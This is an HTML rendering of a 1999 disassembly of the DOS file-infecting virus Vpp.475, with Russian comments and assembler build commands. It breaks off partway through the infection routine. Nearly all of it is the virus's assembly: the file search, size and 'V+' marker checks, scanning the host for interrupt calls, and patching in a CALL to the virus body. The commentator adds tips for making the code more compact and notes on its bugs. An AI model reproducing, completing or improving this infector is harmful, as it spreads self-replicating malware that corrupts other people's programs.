<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VPP.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Вирус Vpp.475 дизассемблирован 05.07.1999 (c) CrkV</span><span class="sc0">

</span><span class="sc1">;tasm vpp.asm /m</span><span class="sc0">
</span><span class="sc1">;tlink vpp.obj /t</span><span class="sc0">

</span><span class="sc1">;В тексте кроме основных комментариев содержатся:</span><span class="sc0">

</span><span class="sc1">;1) Рекомендации по оптимизации ;-)), начинающиеся с OPTI. Например OPTI-LEA,</span><span class="sc0">
</span><span class="sc1">;т.е. эффективнее сразу получить адрес (Lea Dx,[Bp+1Eh] экономит 1 байт,</span><span class="sc0">
</span><span class="sc1">;по сравнению с Mov Dx,Bp, Add Dx,1Eh). Конечно я понимаю, что этот зверек</span><span class="sc0">
</span><span class="sc1">;демонстрационный, но когда видна явная неэффективность кода, я предпочитаю</span><span class="sc0">
</span><span class="sc1">;указать на это ;-)))</span><span class="sc0">

</span><span class="sc1">;2) Предупреждения о возможности ошибок - Warning.</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
        </span><span class="sc9">Org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Vpp</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Entry_Point</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;WARNING - А если Bp нужно проге ???</span><span class="sc0">

        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bp</span><span class="sc0">                      </span><span class="sc1">;получить адрес возврата</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc0">                      </span><span class="sc1">;запихаем его в стек</span><span class="sc0">
        </span><span class="sc6">PushA</span><span class="sc0">                           </span><span class="sc1">;сохраним все регистры</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                   </span><span class="sc1">;Ax:=Bp</span><span class="sc0">

</span><span class="sc1">;WARNING - хочется заметить, т.к. переход на файл осуществляется не</span><span class="sc0">
</span><span class="sc1">;сразу то значения регистров, в том числе сегментных, НЕ ОПРЕДЕЛЕНЫ !!!</span><span class="sc0">
</span><span class="sc1">;Кроме того возможно изменение флагов (н-р Cld), а восстановление</span><span class="sc0">
</span><span class="sc1">;не предусмотрено :-(((</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">My_Point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bp</span><span class="sc0">                      </span><span class="sc1">;Bp:=Offset My_Point</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">My_Point</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">;Исходник ? OPTI-можно выкинуть</span><span class="sc0">
        </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">@Restore_Byte</span><span class="sc0">

</span><span class="sc5">@Ok_Restore</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_Mask</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                  </span><span class="sc1">;FindFirst</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-LEA</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Real_Mask</span><span class="sc0">

</span><span class="sc5">@Find_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Jc</span><span class="sc0">      </span><span class="sc5">@Exit</span><span class="sc0">                   </span><span class="sc1">;Подходящих файлов больше нет</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Check_File</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                  </span><span class="sc1">;FindNext</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@Find_File</span><span class="sc0">

</span><span class="sc5">@Exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Save_DTA</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">;Set DTA</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Восстанавливаем программную DTA</span><span class="sc0">
        </span><span class="sc6">PopA</span><span class="sc0">                            </span><span class="sc1">;Восстанавливаем регистры</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                   </span><span class="sc1">;Ax:=Bp (Сохраняем Bp)</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">@Jmp_Return</span><span class="sc0">             </span><span class="sc1">;исходник (OPTI-не обязательно)</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">;Зашли через Call</span><span class="sc0">

</span><span class="sc5">@Jmp_Return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bp</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                   </span><span class="sc1">;Bp:=Ax (Восстанавливаем Bp)</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">                             </span><span class="sc1">;Выходим из вируса</span><span class="sc0">

</span><span class="sc5">@Restore_Byte</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Var_Word2</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;Opti-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Save_Byte</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;OPTI-выкинуть</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">MovSW</span><span class="sc0">
        </span><span class="sc6">MovSB</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">;Get DTA</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;Opti-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Save_DTA</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">                 </span><span class="sc1">;Сохраняем DTA (Warning)</span><span class="sc0">

</span><span class="sc1">;Вообще-то тут ошибка, т.к. никто не мешает даже .COM программе установить</span><span class="sc0">
</span><span class="sc1">;DTA на сегмент отличный от PSP. Поэтому надо сохранять и сегмент DTA</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">;Set DTA</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;Opti-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">New_DTA</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;устанавливаем свою DTA</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@Ok_Restore</span><span class="sc0">

</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Check_File</span><span class="sc0">      </span><span class="sc9">Proc</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">;Get DTA</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                   </span><span class="sc1">;Di:=Bx (Offset DTA)</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">                </span><span class="sc1">;Open File (чт./запись)</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                   </span><span class="sc1">;Opti-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">                  </span><span class="sc1">;найденное имя в DTA</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Warning</span><span class="sc0">

</span><span class="sc1">;А вдруг файл не откроется ;-))) ???</span><span class="sc0">

        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                   </span><span class="sc1">;Bx:=Ax (File Handle)</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">;LSeek file</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;OPTI-SUB</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                  </span><span class="sc1">;OTI-CWD</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;на выходе Dx:Ax - размер файла</span><span class="sc0">

        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0400h</span><span class="sc0">                </span><span class="sc1">;1024</span><span class="sc0">
        </span><span class="sc6">Jle</span><span class="sc0">     </span><span class="sc5">@Not_Infected</span><span class="sc0">           </span><span class="sc1">;файл маловат</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0C350h</span><span class="sc0">               </span><span class="sc1">;50000 (а почему не 60000 ??? ;-))</span><span class="sc0">
        </span><span class="sc6">Jnb</span><span class="sc0">     </span><span class="sc5">@Not_Infected</span><span class="sc0">           </span><span class="sc1">;а вот этот велик ;-))</span><span class="sc0">

</span><span class="sc1">;Warning - Dx тоже бы не мешало проверить.</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Save_Ofs</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                   </span><span class="sc1">;Dx:=Ax</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;устанавливаем ук. на конец файла - 3</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">;Read File</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;Opti-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Var_Word</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Считаем 2 байта</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;OPTI-LODSB</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'+V'</span><span class="sc0">                 </span><span class="sc1">;V+ - метка вируса</span><span class="sc0">

</span><span class="sc1">;OPTI - а зачем 3 байта в конец ? (V+ тоже красиво ;-))</span><span class="sc0">

        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">@Not_Infected</span><span class="sc0">           </span><span class="sc1">;возможно заражен</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">;Lseek File</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                   </span><span class="sc1">;устанавливаем указатель на начало</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                   </span><span class="sc1">;OPTI-Cwd</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">

</span><span class="sc5">@Not_Infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">;Close File</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">

</span><span class="sc1">;OPTI - а поближе к началу найти не судьба ??? ;-))</span><span class="sc0">

        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">Check_File</span><span class="sc0">      </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
        </span><span class="sc6">PushA</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">               </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">;Read File</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;Считываем 1024 байта</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Int10h</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">;OPTI-Mov Bl,2</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Scan</span><span class="sc0">                    </span><span class="sc1">;Проверяем наличие слова 10CDh (Int 10h)</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">

</span><span class="sc1">;       Cmp     Di,0FFFFh               ;OPTI-Inc Di</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">                </span><span class="sc1">;Tasm тута оптимизирует ;-))</span><span class="sc0">
        </span><span class="sc9">Org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">;для совместимости кода</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFFFh</span><span class="sc0">

        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">@Scan_CD21h</span><span class="sc0">             </span><span class="sc1">;не нашли поищем 21CDh</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Cont_Infect</span><span class="sc0">             </span><span class="sc1">;Поедем заражать</span><span class="sc0">

</span><span class="sc5">@Exit_Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PopA</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">@Scan_CD21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Int21h</span><span class="sc0">               </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">;OPTI-Mov Bl,02h</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Scan</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc0">

</span><span class="sc1">;       Cmp     Di,0FFFFh               ;OPTI-Inc Di</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">1234h</span><span class="sc0">                </span><span class="sc1">;Tasm тута оптимизирует ;-))</span><span class="sc0">
        </span><span class="sc9">Org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">;для совместимости кода</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFFFh</span><span class="sc0">

        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">@Exit_Infect</span><span class="sc0">            </span><span class="sc1">;Тут нет и 21CDh, придется отвалить</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Cont_Infect</span><span class="sc0">             </span><span class="sc1">;Поедем заражать</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">@Exit_Infect</span><span class="sc0">

</span><span class="sc1">;OPTI - и вообще этот кусок идентичен поиску 10CDh</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">

</span><span class="sc5">Int10h</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry_Point</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">Cont_Infect</span><span class="sc0">     </span><span class="sc9">Proc</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">;Lseek File</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                   </span><span class="sc1">;тут будет переход на тело вируса</span><span class="sc0">
        </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Save_Ofs</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;вычисляем смещение для Call вирус</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Bp</span><span class="sc0">                   </span><span class="sc1">;OPTI-Lea</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Save_Byte</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">      </span><span class="sc1">;Call Entry_Point</span><span class="sc0">
